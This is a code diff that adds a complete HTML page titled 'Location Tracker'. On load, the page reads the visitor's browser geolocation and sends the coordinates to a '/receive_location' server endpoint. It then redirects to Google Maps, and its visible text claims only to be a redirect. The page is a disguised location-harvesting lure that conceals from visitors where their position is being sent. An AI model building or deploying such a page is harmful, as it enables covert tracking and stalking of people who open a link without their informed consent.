@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Tracker</title>
+    <script>
+        // Automatically get user's geolocation on page load
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToServer, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        };
+
+        // Function to send latitude and longitude to the server
+        function sendLocationToServer(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Send the location data to the server using fetch API
+            fetch('/receive_location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    latitude: latitude,
+                    longitude: longitude
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Location data sent successfully:', data);
+                
+                // Automatically redirect to the new website after sending location data
+                window.location.href = "https://maps.google.com";  // Redirect to specified URL
+            })
+            .catch(error => {
+                console.error('Error sending location data:', error);
+                // Still redirect even if there is an error
+                window.location.href = "https://maps.google.com";  // Redirect to specified URL
+            });
+        }
+
+        // Function to handle geolocation errors
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+            // Redirect after showing the error message
+            window.location.href = "https://maps.google.com";  // Redirect to specified URL
+        }
+    </script>
+</head>
+<body>
+    <p>Redirect to google.map</p>
+</body>
+</html>
